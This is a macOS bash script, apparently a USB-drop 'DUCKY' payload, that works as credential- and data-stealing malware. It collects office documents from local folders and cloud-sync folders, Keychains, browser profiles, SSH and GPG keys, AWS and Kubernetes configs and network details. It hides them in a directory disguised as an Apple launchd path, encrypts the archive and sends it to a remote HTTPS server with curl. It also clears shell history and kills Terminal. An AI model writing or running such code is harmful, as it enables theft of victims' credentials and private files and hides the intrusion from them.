#!/bin/bash

random_extension=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&()_-+' < /dev/urandom | head -c 8)
encryption_password=$(LC_ALL=C tr -dc 'A-Za-z0-9!@#$%^&()_-+' < /dev/urandom | head -c 32)
hidden_dir="/private/var/tmp/.com.apple.launchd.$random_extension"
stor_dir="/private/var/tmp/.com.apple.launchd.$random_extension"
hidden_file="$random_extension.l.oo.t.tgz"
ssh_private_key="/Volume/DUCKY/.s"
remote_path="/"


# Remote server configuration
https_server="localhost"
https_port="8080"
https_cert="exfil.crt"
scp_server="localhost"
scp_port="2222"


if [ ! -d "$hidden_dir" ] ; then
   mkdir -p "$hidden_dir"
fi

if [ ! -d "$stor_dir" ] ; then
   mkdir -p "$stor_dir"
fi

echo $encryption_password | base64 > /Volumes/DUCKY/.encpw


check_ssh_endpoint() {
  # Check SSH server (for both SCP and Rsync)
  ssh -q -p $scp_port -o ConnectTimeout=1 "$remote_ssh_user@$scp_server" &> /dev/null
  if [ $? -ne 0 ]; then
    exit 1
  else 
    return 0
  fi 
}

exfil_files() {
  mkdir -p "$hidden_dir/files"
  for src_dir in ~/Desktop ~/Documents ~/Downloads; do
    find "$src_dir" -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/files/" \; &> /dev/null
  done
  
  exfil_files_pid=$!
}

exfil_cloud() {
  mkdir -p "$hidden_dir/cloud_files"
  if [ -d "$HOME/Dropbox" ]; then
    cd "$HOME/Dropbox"
    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/cloud_files/" \; &> /dev/null
  fi

  google_drive_path="$HOME/Library/CloudStorage/$(ls ~/Library/CloudStorage)"
  if [ -d $HOME/Library/CloudStorage ]; then
    cd "$google_drive_path"
    cd My\ Drive
    find ./ -type f \( -name "*.doc" -o -name "*.docx" -o -name "*.xls" -o -name "*.xlsx" -o -name "*.ppt" -o -name "*.pdf" -o -name "*.csv" -o -name "*.odt" \) -exec rsync -a --relative {} "$hidden_dir/cloud_files/" \; &> /dev/null
  fi

  exfil_cloud_pid=$!
}

exfil_keychains() {
  mkdir -p "$hidden_dir/keychains"
  cp -r ~/Library/Keychains/* $hidden_dir/keychains
}

exfil_browsers() {
  mkdir -p "$hidden_dir/browsers"

  cp -r "$HOME/Library/Application Support/Google/Chrome" "$hidden_dir/browsers/" &>/dev/null
  cp -r "$HOME/Library/Application Support/BraveSoftware/Brave-Browser" "$hidden_dir/browsers/" &>/dev/null
  cp -r "$HOME/Library/Application Support/Firefox" "$hidden_dir/browsers/" &>/dev/null
  cp -r "$HOME/Library/Safari" "$hidden_dir/browsers/Safari/" &>/dev/null


  exfil_browser_pid=$!
}

network_details() {
  mkdir -p "$hidden_dir/network"
  networksetup -getinfo Wi-Fi >> "$hidden_dir/network/wifi_ip.txt" &> /dev/null
  netstat -an | grep ESTABLISHED >> "$hidden_dir/network/active_connections.txt"
  ifconfig >> "$hidden_dir/network/ifconfig.txt"
  arp -a >> "$hidden_dir/network/arp.txt"
  networksetup -listpreferredwirelessnetworks en0 | awk 'NR>1 {print $1}' >> "$hidden_dir/network/saved_wifi_ssid.txt" &> /dev/null

  lsof -Pn -i4 | grep LISTEN >> $hidden_dir/network/listening_ports.txt &> /dev/null

  for ext_net in ip city region country loc org postal timezone; do
    echo " $ext_net - $(curl -s https://ipinfo.io/$ext_net)" >> "$hidden_dir/network/external_net"
  done
}

exfil_bt() {
  system_profiler SPBluetoothDataType >> "$hidden_dir/network/bluetooth.txt"
}

exfil_keys() {
  mkdir -p "$hidden_dir/keys"
  cp -r ~/.ssh  $hidden_dir/keys/ &> /dev/null
  cp -r ~/.gnupg $hidden_dir/keys/ &> /dev/null
}

exfil_fs() {
  df -h > $hidden_dir/configs/df.txt
}

exfil_apps() {
  mkdir -p $hidden_dir/apps
  system_profiler SPApplicationsDataType $hidden_dir/apps/installed_apps.txt
}

exfil_config() {
  mkdir -p "$hidden_dir/configs"
  config_files=( ".config*"
                 ".bash*"
                 "*.vim*"
                 ".git"
                 "*.zsh*"
                 "*.conf*"
                 "*.aws*"
                 "*.kube*"
               )

  printenv >> "$hidden_dir/configs/env_variables.txt"

  for files in "$HOME/${config_files[@]}"; do
    cp -r $HOME/$files "$hidden_dir/configs/" &> /dev/null
  done
}

exfil_compress() {
  mkdir -p "$stor_dir"
  cd "$stor_dir"
  nohup tar cfz - "$hidden_dir" | openssl enc -aes-256-cbc -salt -out "$stor_dir/$hidden_file.enc" -pass pass:$encryption_password &> /dev/null

  if [ $? -ne 0 ]; then
    cleanup
    exit 1
  fi

  compress_pid=$!
}

exfiltrate() {
  if [ -e $https_cert ]; then
    nohup curl --cert $https_cert --upload-file "$stor_dir/$hidden_file.enc" https://$https_server:$https_port/ &> /dev/null &
  else 
    nohup curl --insecure --upload-file "$stor_dir/$hidden_file.enc" https://$https_server:$https_port/ &> /dev/null &
  fi
    
  if [ $? -ne 0 ]; then
    cleanup
    exit 1
  fi
  
  exfiltrate_pid=$!
}

cleanup() {
  # Overwrite files before deletion
    rm -rf "$hidden_dir"
    rm -rf "$stor_dir"
    echo > ~/.zsh_history
    echo > ~/.bash_history
    history -c 
}

exfil_files &
exfil_cloud &
exfil_browsers &

network_details
exfil_config
exfil_bt
exfil_keys
exfil_keychains

wait $exfil_files_pid $exfil_cloud_pid $exfil_browsers_pid
exfil_compress & 

#wait $compress_pid
# exfiltrate &

#wait $exfiltrate_pid
wait $compress_pid
cleanup &

killall Terminal
